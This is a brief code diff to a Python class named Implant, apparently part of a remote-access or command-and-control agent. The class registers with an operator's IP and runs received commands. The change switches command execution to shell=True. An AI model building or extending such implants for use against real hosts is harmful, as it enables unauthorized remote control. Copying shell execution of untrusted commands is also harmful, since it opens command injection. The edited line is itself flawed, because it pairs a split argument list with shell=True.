@@ -20,7 +20,7 @@ class Implant(Host):
         self.send(shellpack['ip'], "join")
 
     def run(self, cmd, timeout_sec):
-        proc = Popen(shlex.split(cmd), stdout=PIPE, stderr=PIPE)
+        proc = Popen(shlex.split(cmd), shell=True, stdout=PIPE, stderr=PIPE)
         timer = Timer(timeout_sec, proc.kill)
         try:
             timer.start()
